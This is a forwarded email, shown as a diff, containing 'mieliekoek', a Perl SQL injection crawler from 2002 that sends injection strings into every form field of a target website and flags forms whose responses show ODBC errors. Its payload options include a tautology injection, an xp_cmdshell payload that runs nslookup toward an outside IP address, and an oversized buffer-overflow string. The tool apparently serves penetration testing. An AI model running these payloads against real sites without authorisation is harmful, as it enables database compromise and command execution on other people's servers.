@@ -1,0 +1,318 @@
+---------- Forwarded message ----------
+
+#!/usr/bin/perl
+
+# mieliekoek - SQL insertion crawler
+
+# Test all forms on a web site for possible SQL insertion problems.
+
+# This script takes the output of a web mirroring tools as input. It
+# inspects every file and determine if there is a form in the file. If so it
+# tries to do some some form of SQL insertion (inserts blah' in all fields)
+# and looks at the output - if it sees "ODBC" it marks the form as
+# vulnerable. Of course this is a very lame test - another would be to do a
+# xp_cmdshell with a nslookup and see if the UDP packets gets back to you on
+# port 53 - a better test, but not intergrated in here. Output is written in
+# a file called <website>.report and contains all kinds of nice goodies.
+# Have a look.
+
+# The script has some intelligence regarding the parsing of forms. Note that
+# the script always send the POST to the target - the second parameter -
+# thus not always to the site that is used in the action of the form. This
+# was done to make sure you dont attack something like topsecret.nsa.gov by
+# mistake just because someone has a form that posts to their site.
+
+# Usage: perl mieliekoek.pl <path to mirrored files> <target> <debug>
+# e.g. perl mieliekoek.pl /tmp/websites/www.a.com/www.a.com www.a.com xx
+
+# Use the script with HTTrack (web mirroring tool). HTTrack is very cool and
+# works very nicely in Unix. It's also nice because it populates the action
+# field in a form  with the absolute path and not the relative path
+# (http://www.httrack.com/httrack-3.15-2.tar.gz). The script does a simple
+# "find" in the path specified and reads all the files from STDIN. Debug is
+# either "x" for small amounts of debug info or "xx" for large amounts.
+
+# You can also use this script to test for buffer overflows in home grown
+# web applications by sending overly huge amounts of crap. See the code.
+
+# Enjoy,
+# Roelof Temmingh (roelof@sensepost.com)
+# http://www.sensepost.com
+# 2002/02/22
+
+use Socket;
+$|=1;
+
+# What are we sending today? (uncomment the one you like best)
+$badstring="blah'";
+#$badstring="blah' or 1=1 --";
+#$badstring="blah' exec master..xp_cmdshell 'nslookup a.com 196.30.67.5' --";
+#$badstring=('X' x 2050);
+
+($path)=@ARGV[0]; ($target)=@ARGV[1]; ($debug)=@ARGV[2];
+$masterforms=0; $vulnforms=0; $acin=0;
+@files=`find $path | sort`;
+foreach $file (@files){
+ if (length($debug)>1){print "f.";}
+ if (($file =~ /html/i) || ($file =~ /asp/i)){
+
+  $flag=-1;  $in=-1;
+
+  open (IN, $file) || die "Cannot open file $file\n";
+  #get the page in one large chunk
+  @page=<IN>;
+  close (IN);
+
+  ##clear the buffers (300 forms per page?)
+  for ($l=0; $l<300; $l++){
+   $formstatement[$l]="";
+   $form[$l]="";
+  }
+
+  foreach $line (@page){
+   $line =~ s/\n//g; $line =~ s/\r//g;
+   @chars=split(//,$line);
+   for ($i=0; $i <= $#chars; $i++){
+
+    #detects open bracket
+    if ((@chars[$i] eq '<') && ($flag==-1)) {$flag=0;}
+
+    #detects "form "
+    if ($flag==0) {
+     $isform=@chars[$i].@chars[$i+1].@chars[$i+2].@chars[$i+3].@chars[$i+4].@chars[$i+5];
+     if ($isform =~ /<form /i) {
+      $flag=1;
+      $in++;
+      $i=$i+4;
+     }
+    }
+
+    #detects end of form statement
+    if ($flag==1) {
+     $formstatement[$in]=$formstatement[$in].@chars[$i];
+     if (@chars[$i] eq '>') {
+      $flag=2;
+     }
+    }
+
+    #detects end of complete form
+    if ($flag==2){
+     $isformend=@chars[$i].@chars[$i+1].@chars[$i+2].@chars[$i+3].@chars[$i+4];
+     if ($isformend =~ /\/form/i) {
+      $flag=-1;
+      $i=$i+4;
+     } else {$form[$in]=$form[$in].@chars[$i];}
+    }
+   }
+  }
+
+  ## ## OK we got the forms - now we need to parse it
+
+  $masterforms=$masterforms+($in+1);
+  # first the form actions etc.
+  for ($i=0; $i<$in+1; $i++){
+   $workheader=$formstatement[$i];
+
+   ##extract header
+   for ($j=2; $j<length($workheader); $j++) {
+    $line=addstring($workheader,$j,">");
+    $j=$j+length($line);
+    $theaction=extract(" action",$line);
+    if (length($theaction)<1) {
+
+     # if there is no action we need to post to ourselfs - yuk!
+     @blah=split(/$target/,$file);
+     ($name,$ext)=split(/\./,@blah[2]);
+     $theaction="http://".$target.$name.".asp";
+    }
+    $themethod=extract("method",$line);
+    $thefname=extract("name",$line);
+
+    ## insert the action into a list (we dont wanna check the same ASP 200 times)
+    $actions{$theaction}++;
+    if ($actions{$theaction} eq 1) {
+     print "\n\nFile $file\n [$theaction]\n";
+     qprint ("\n===========================\n File $file Form [$theaction]\n===========================\n");
+    }
+   }
+
+   #extracts body of form
+   if ($actions{$theaction} eq 1) {
+    $work=$form[$i];
+    qprint ("FORM:\nv v v v v v v v v v v v v v v v v v v v v v v v v v\n");
+    qprint ("<for$workheader $work/form>\n^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^\n\n");
+    for ($j=2; $j<length($work); $j++) {
+
+     $line=addstring($work,$j,">");
+     $j=$j+length($line);
+     if (length($debug)>1){print ".p";}
+
+     #### drop down list (once)
+     if ($line =~ /<select /i){
+      $thename = extract(" name",$line);
+      $poststring=$poststring.$thename."=".$badstring."&";
+      qprint ("[$thetype] [$thename] [$thevalue]\n");
+     }
+     elsif ($line =~ /input/i) {
+
+      $thetype = extract("type",$line);
+      $thename = extract(" name",$line);
+
+      #### checkbox (once)
+      if ($thetype =~ /checkbox/i) {
+       $checkbox{$thename}++;
+       if ($checkbox{$thename} == 1){
+        $poststring=$poststring.$thename."=".$badstring."&";
+       }
+      }
+      ### radio button (once)
+      elsif ($thetype =~ /radio/i) {
+       $radio{$thename}++;
+       if ($radio{$thename} == 1){
+        $poststring=$poststring.$thename."=".$badstring."&";
+       }
+      }
+      else {
+       $thevalue = extract("value",$line);
+       #### populate with the bad stuff
+       if (($thetype !~ /mailto/i) && (length($thename) > 0)){
+
+        $poststring=$poststring.$thename."=";
+        ### check if its a submit button - then preserve the submit
+        if ($thetype =~ /submit/i) {
+         $thevalue =~ s/ /\+/g;
+         $poststring=$poststring.$thevalue;
+        }
+        else {$poststring=$poststring.$badstring;}
+        $poststring=$poststring."&";
+        qprint ("[$thetype] [$thename] [$thevalue]\n");
+       }
+      }
+     }
+    }
+    qprint ("--------------------------------\n");
+
+    ## ## we build the actual POST ourselves
+    # remove the last &
+    @newpoststring=split(//,$poststring);
+    for ($p=0; $p<$#newpoststring; $p++){
+     $newpoststring=$newpoststring.@newpoststring[$p];
+    }
+
+    ## build the POSTSTRING - translations
+    $newpoststring =~ s/\,/%2c/g;  $newpoststring =~ s/\>/%3e/g;
+    $newpoststring =~ s/\+/%2b/g;  $newpoststring =~ s/\@/%40/g;
+    $newpoststring =~ s/ /\+/g;
+
+    ##build the real action
+    $plength=length($newpoststring);
+    @actions=split(/\//,$theaction);
+    $postaction="/";
+    for ($o=3; $o<$#actions; $o++){
+     $postaction=$postaction.@actions[$o]."/";
+    }
+    $postaction=$postaction.@actions[$#actions];
+
+$xtosend=<<EOT
+POST $postaction HTTP/1.0
+Accept: */*
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; TUCOWS; Q312461)
+Content-Length: $plength
+Host: $target
+Content-Type: application/x-www-form-urlencoded
+
+$newpoststring
+
+EOT
+;
+    $xtosend=~s/\n/\r\n/g;
+    #send it off
+    if (length($debug)>0){qprint ("We sent:\n---------\n$xtosend");}
+    @results=sendraw2($xtosend,80,$target,20);
+    qprint ("Response\n----------\n");
+    qprint (@results);
+
+    #check if vulnerable
+    $vuln=0;
+    foreach $line (@results){
+     if ($line =~ /ODBC/i) {$vuln=1;}
+    }
+    if ($vuln==1){
+     qprint ("\n=========>>>Form should be vulnerable<<<=========\n");
+     print "\n==>Form should be vulnerable!\n";
+     $vulnforms=$vulnforms+1;
+    }
+    $newpoststring=""; $poststring="";
+   }
+  }
+ }
+}
+print "\nFinished...\n$#files files\n$masterforms forms\n$vulnforms vulnerable forms\n";
+
+### subs
+
+sub addstring {
+ $myscalar="";
+ ($scalar,$start,$marker)=@_;
+ @temp=split(//,$scalar);
+  for ($p=$start-1 ;;  $p++){
+   if ((@temp[$p] eq $marker) || ($p > $#temp)){last;}
+    $myscalar=$myscalar.@temp[$p];
+  }
+ return $myscalar;
+}
+
+sub extract {
+ ($uit,$passed)=@_;
+ $passed =~ s/[<>]//g;
+ ($duh,$real)=split(/$uit/i,$passed);
+ ($duh,$real2)=split(/\=/i,$real);
+ if ($real2 =~ /\"/){($duh,$real3,$duh)=split(/\"/i,$real2);}
+  else {($real3,$duh)=split(/ /,$real2)};
+ $real3=~s/\"//g;
+ return $real3;
+}
+
+sub sendraw2 {
+ my ($pstr,$realport,$realip,$timeout)=@_;
+ $target2 = inet_aton($realip);
+ $flagexit=0;
+ $SIG{ALRM}=\&ermm;
+ socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems");
+ if(connect(S,pack "SnA4x8",2,$realport,$target2)){
+  my @in;
+  select(S);  $|=1;  print $pstr;
+  alarm($timeout);
+  while(<S>){
+   if (length($debug)>1){print STDOUT "r.";}
+   if ($flagexit == 1){close (S); print STDOUT "Timeout\n";  return "Timeout"; }
+   push @in, $_;
+  }
+  alarm(0);
+  select(STDOUT); close(S);
+  return @in;
+ } else {return ""; }
+}
+sub ermm{
+ $flagexit=1;
+ close (S);
+}
+
+sub qprint
+{
+  open(db,">>$target.report") || die "Couldnt open quickwrite\n";
+  print db @_;
+  close (db);
+}
+
+#spidermark sensepostdata mieliekoek
+
+------------------------------------------------------
+Roelof W Temmingh               SensePost IT security
+roelof@sensepost.com            +27 83 448 6996
+http://www.sensepost.com        http://www.hackrack.com
+
+
+
